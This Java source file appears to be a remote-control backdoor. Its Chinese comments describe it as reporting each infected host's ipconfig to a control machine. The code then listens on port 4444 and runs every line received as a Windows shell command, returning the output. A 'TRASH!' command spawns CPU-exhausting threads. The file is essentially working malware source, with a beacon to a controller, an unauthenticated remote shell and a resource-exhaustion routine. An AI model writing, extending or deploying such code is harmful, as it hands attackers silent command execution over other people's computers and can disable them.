package com.demo.hc;

import java.io.IOException;
import java.io.PrintWriter;
import java.net.ServerSocket;
import java.net.Socket;
import java.util.Scanner;

import com.demo.model.InfoSender;
import com.demo.model.ShellRunner;

/**
 * 入口函数，每当有主机运行到入口函数都会通过socket先发送自己的ipconfig信息到指定IP的控制机上，之后4444端口开启一个serversocket监听
 * 如果收到了一个新的请求，则会在一个新的线程中建立一 个socket连接，直到telnet客户端发送 QUIT!指令，由受控主机结束连接。
 * 
 * 默认监听端口 8888
 * 
 * 支持的命令 1.Windows CMD可运行的bat脚本、Windosw内置的命令 2.TRASH!启动一个新线程进行基础的运算 3.QUIT!由受控主机结束当前的连接
 */
public class Entrance {
    
    public static void main(String[] args){
        InfoSender.send();  // 向控制主机发送 ipconfig 信息
        try(ServerSocket serverSocket = new ServerSocket(4444)){
            while(true){
                new Thread(new SocketRunner(serverSocket.accept())).start();
            }
        }catch(IOException ignored){;}
    }

    static class SocketRunner implements Runnable{
        
        private Socket incoming;
        private ShellRunner runner;
        private static int threshold = Integer.MAX_VALUE;

        SocketRunner(Socket incoming){
            this.incoming = incoming;
            // runner = new ShellRunner(System.getProperty("user.dir") + "\\regedit.bat");
            runner = new ShellRunner("NULL");
            runner.callCMD();
        }

        @Override
        public void run(){
            try(Scanner cmdIn = new Scanner(incoming.getInputStream());
            PrintWriter feedbackWriter = new PrintWriter(incoming.getOutputStream())){
                
                while(cmdIn.hasNextLine()){
                    String cmd = cmdIn.nextLine();
                    if(cmd.equals("QUIT!")){
                        cmdIn.close();
                        incoming.close();
                        break;
                    }if(cmd.equals("TRASH!")){
                        new Thread(()->{
                            Integer count = 0;
                            for(int i = 0; i < threshold; i ++)
                                for(int j = 0; j < threshold; j ++)
                                    count += (Integer) i * j;
                        }).start();
                    }
                    else  {
                        feedbackWriter.write(runner.runShell(cmd));
                        feedbackWriter.flush();
                    }
                }
            }catch(Exception ignored){;}
        }
    }
}
